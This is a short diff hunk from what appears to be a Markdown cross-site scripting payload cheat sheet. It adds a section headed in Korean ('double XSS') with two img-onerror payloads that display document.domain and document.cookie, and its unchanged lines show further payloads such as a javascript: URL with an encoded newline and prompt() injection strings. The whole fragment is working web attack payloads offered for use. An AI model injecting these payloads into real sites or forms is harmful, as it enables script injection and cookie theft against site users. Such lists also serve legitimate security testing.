@@ -25,6 +25,11 @@ XSS with %0d
 javascript://%0aalert(1)
 ```
 
+**이중 XSS**
+```javascript
+">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
+```
+
 ```
 "-prompt(8)-"
 '-prompt(8)-'
